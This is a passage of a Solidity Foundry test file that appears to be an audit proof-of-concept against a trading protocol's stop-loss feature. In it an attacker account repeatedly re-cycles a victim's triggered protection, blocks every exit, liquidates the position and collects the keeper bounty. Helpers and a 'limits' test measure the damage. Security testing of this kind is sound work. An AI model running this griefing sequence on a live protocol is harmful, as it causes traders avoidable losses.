            protectionActions.amendLatchedPositionProtectionCloseLimits(pid, _unlimited());
            bytes[] memory data = _mockPythUpdateData(GAP_PRICE);
            vm.prank(ATTACKER);
            child = griefer.cycle(pid, data);
        }
        _assertEveryOwnerExitBlocked(ALICE, pid);
        uint256 freeBefore = _freeSettlementAssets(ALICE);

        _mockPythUpdateData(LIQ_PRICE);
        bytes[] memory liq = _livePriceData(LIQ_PRICE);
        vm.prank(ATTACKER);
        router.executeLiquidation(ALICE, liq);
        assertEq(_size(ALICE), 0, "liquidated");
        assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Liquidated), "terminal");
        uint256 lossLocked = start - clearinghouse.balanceAssets(ALICE);

        console2.log("D: victim loss, control (amend + exit at 1.03)   (USDG 6dp):", lossControl);
        console2.log("D: victim loss, attack (locked, liquidated 1.05) (USDG 6dp):", lossLocked);
        console2.log("D: EXTRA victim loss caused by the denied amend  (USDG 6dp):", lossLocked - lossControl);
        console2.log("D: attacker liquidation keeper bounty            (USDG 6dp):", clearinghouse.balanceAssets(ATTACKER));
        console2.log("D: victim free settlement that stayed withdrawable (USDG 6dp):", freeBefore);
        assertGt(lossLocked, lossControl + 1500e6, "locked victim loses >1,500 USDG more on a 100k position");
        assertGt(clearinghouse.balanceAssets(ATTACKER), 0, "attacker can also collect the liquidation bounty");
    }

    // ------------------------------------------------------------------------------------------------------------
    // E. Honest limits. It is a per-block race, not a hard freeze: `executeOrder` is permissionless, so an owner who
    //    controls a batching account can do execute(child) + amend + retry atomically and escapes in any block in
    //    which she is sequenced before the attacker. Two separate owner transactions are back-run by a retry.
    // ------------------------------------------------------------------------------------------------------------

    function test_E_Limits_OwnerEscapesOnlyWithAtomicBatchSequencedBeforeTheAttacker() public {
        // (1) EOA owner with two transactions: execute lands, attacker retry lands before her amend.
        uint256 snap = vm.snapshotState();
        {
            (uint64 pidE, uint64 childE) = _openProtectAndTrigger(ALICE);
            bytes[] memory d = _mockPythUpdateData(GAP_PRICE);
            vm.prank(ALICE);
            router.executeOrder(childE, d);
            assertEq(uint8(_status(pidE)), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched), "latched");
            vm.prank(ATTACKER);
            protectionActions.retryPositionProtectionClose(pidE);
            vm.prank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(pidE, _unlimited());
        }
        vm.revertToState(snap);

        // (2) Batching owner.
        BatchAccount account = new BatchAccount(address(this));
        _fundTrader(address(account), ALICE_DEPOSIT);
        (uint64 pid, uint64 child) = _openProtectAndTrigger(address(account));
        for (uint256 i; i < 5; ++i) {
            bytes[] memory d = _mockPythUpdateData(GAP_PRICE);
            vm.prank(ATTACKER);
            child = griefer.cycle(pid, d);
        }
        bytes[] memory data = _mockPythUpdateData(GAP_PRICE);
        address[] memory targets = new address[](3);
        bytes[] memory calls = new bytes[](3);
        targets[0] = address(router);
        calls[0] = abi.encodeCall(OrderRouter.executeOrder, (child, data));
        targets[1] = address(protectionBook);
        calls[1] = abi.encodeCall(IPositionProtectionActions.amendLatchedPositionProtectionCloseLimits, (pid, _unlimited()));
        targets[2] = address(protectionBook);
        calls[2] = abi.encodeCall(IPositionProtectionActions.retryPositionProtectionClose, (pid));

        // (2a) attacker sequenced first in the block -> her whole batch reverts, she is locked for another block.
        snap = vm.snapshotState();
        vm.prank(ATTACKER);
        griefer.cycle(pid, data);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__OrderNotQueueHead.selector);
        account.executeBatch(targets, calls);
        vm.revertToState(snap);

        // (2b) owner sequenced first -> atomic execute + amend + retry; the attacker's cycle is harmless afterwards.
        account.executeBatch(targets, calls);
        uint64 amendedChild = protectionViews.getPositionProtection(pid).linkedOrderId;
        vm.prank(ATTACKER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        griefer.cycle(pid, data); // the amended child is in its commit block: it stays pending, the retry reverts
        data = _mockPythUpdateData(GAP_PRICE);
        vm.prank(HONEST_KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(amendedChild, data);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "batching owner exits");
        assertEq(_size(address(account)), 0, "closed");
        console2.log("E: EOA owner (2 txs) back-run by retry -> amend reverts; batching owner escapes only when first in block");
    }

    // ------------------------------------------------------------------------------------------------------------
    // helpers
    // ------------------------------------------------------------------------------------------------------------

    /// @dev Production V3 intent.
    function _request(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (OrderV3Types.OrderRequest memory) {
        uint32 window = uint32(router.maxExecutionWindowSeconds());
        return OrderV3Types.OrderRequest({
            clientOrderId: bytes32(clientNonce++),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: ((side == CfdTypes.Side.LONG) == isClose) ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp()) + uint64(window),
                executionWindowSeconds: window,
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    /// @dev V3 open through Router.commitOrder + permissionless executeOrder, then an existing-position stop-loss with
    ///      a finite `maxGrossAccountDebitAssets`, then a permissionless trigger exactly at the stop.
    function _openProtectAndTrigger(
        address account
    ) internal returns (uint64 pid, uint64 child) {
        OrderV3Types.OrderRequest memory req = _request(CfdTypes.Side.LONG, SIZE, MARGIN, false);
        vm.prank(account);
        uint64 openId = OrderRouter(address(router)).commitOrder(req);
        bytes[] memory data = _mockPythUpdateData(ENTRY_PRICE);
        vm.prank(HONEST_KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(openId, data);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "open executed");
        assertEq(_size(account), SIZE, "position open");
        // MockPyth keeps its "latest" store separate from the historical one used for order execution; publish the
        // current tick through the permissionless mark refresh so the Book's fresh-observation gate sees it.
        _refreshMark(ENTRY_PRICE);

        PositionProtectionTypes.PositionProtectionParams memory params;
        params.stopLossTriggerPrice = STOP_LOSS;
        params.closeLimits = _unlimited();
        params.closeLimits.maxGrossAccountDebitAssets = MAX_DEBIT_CEILING;
        vm.prank(account);
        pid = protectionActions.createPositionProtection(params);
        child = _triggerAt(pid, STOP_LOSS);
        assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered), "triggered");
    }

    /// @dev The intended MED-9 recovery: failing child is processed, protection rests Latched, owner amends, retry closes.
    function _controlExit(
        address account,
        uint64 pid,
        uint64 child,
        uint256 startBalance
    ) internal returns (uint256 loss) {
        bytes[] memory data = _mockPythUpdateData(GAP_PRICE);
        vm.prank(HONEST_KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(child, data);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Failed), "gapped close fails");
        assertEq(uint8(r.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation), "ceiling");
        assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched), "latched");

        vm.prank(account);
        protectionActions.amendLatchedPositionProtectionCloseLimits(pid, _unlimited());
        vm.prank(account);
        uint64 retry = protectionActions.retryPositionProtectionClose(pid);
        data = _mockPythUpdateData(GAP_PRICE);
        vm.prank(HONEST_KEEPER);
        r = router.executeOrder(retry, data);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended retry executes");
        assertEq(_size(account), 0, "closed");
        loss = startBalance - clearinghouse.balanceAssets(account);
    }

    function _ownerAmendReverts(
        address account,
        uint64 pid
    ) internal returns (uint256 reverted) {
        vm.prank(account);
        try protectionActions.amendLatchedPositionProtectionCloseLimits(pid, _unlimited()) {
            reverted = 0;
        } catch (bytes memory err) {
            assertEq(bytes4(err), IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector, "ProtectionNotLatched");
            reverted = 1;
        }
    }

    /// @dev Everything the owner can call while the protection is `Triggered`.
    function _assertEveryOwnerExitBlocked(
        address account,
        uint64 pid
    ) internal {
        PositionProtectionTypes.PositionProtectionParams memory newParams;
        newParams.stopLossTriggerPrice = 110_000_000;
        newParams.closeLimits = _unlimited();
        OrderV3Types.OrderRequest memory closeReq = _request(CfdTypes.Side.LONG, SIZE, 0, true);

        vm.startPrank(account);
        // (a) the MED-9 recovery lane
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(pid, _unlimited());
        // (b) cancel
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtection(pid);
        // (c) replace
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.replacePositionProtection(pid, newParams);
        // (d) MED-30 atomic manual exit
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtectionAndCommitClose(pid, closeReq);
        // (e) ordinary V3 close
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        OrderRouter(address(router)).commitOrder(closeReq);
        // (f) a second protection
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionAlreadyActive.selector);
        protectionActions.createPositionProtection(newParams);
        // (g) an owner retry (a child is already live)
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.retryPositionProtectionClose(pid);
        // (h) pulling the position margin out (only free settlement is withdrawable)
        uint256 free = _freeSettlementAssets(account);
        vm.expectRevert();
        clearinghouse.withdraw(account, free + 1);
        vm.stopPrank();

        // (i) executing the live child in its own commit block does nothing (same-block shield)
        uint64 child = protectionViews.getPositionProtection(pid).linkedOrderId;
        vm.prank(account);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(child, new bytes[](1));
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Pending), "child stays pending in commit block");
        assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered), "still triggered");
    }

    function _status(
        uint64 pid
    ) internal view returns (PositionProtectionTypes.PositionProtectionStatus) {
        return protectionViews.getPositionProtection(pid).status;
    }

    function _size(
        address account
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    function _unlimited() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory limits) {
        limits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _triggerAt(
        uint64 protectionId,
        uint256 price
    ) internal returns (uint64 linkedOrderId) {
        _mockPythUpdateData(price);
        bytes[] memory updateData = _livePriceData(price);
        vm.prank(TRIGGER_KEEPER);
        linkedOrderId = protectionActions.triggerPositionProtection(protectionId, updateData);
    }

    function _refreshMark(
        uint256 price
    ) internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        router.updateMarkPrice(_livePriceData(price));
    }

    function _livePriceData(
        uint256 price
    ) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] =
                MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), previous));
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

}
```

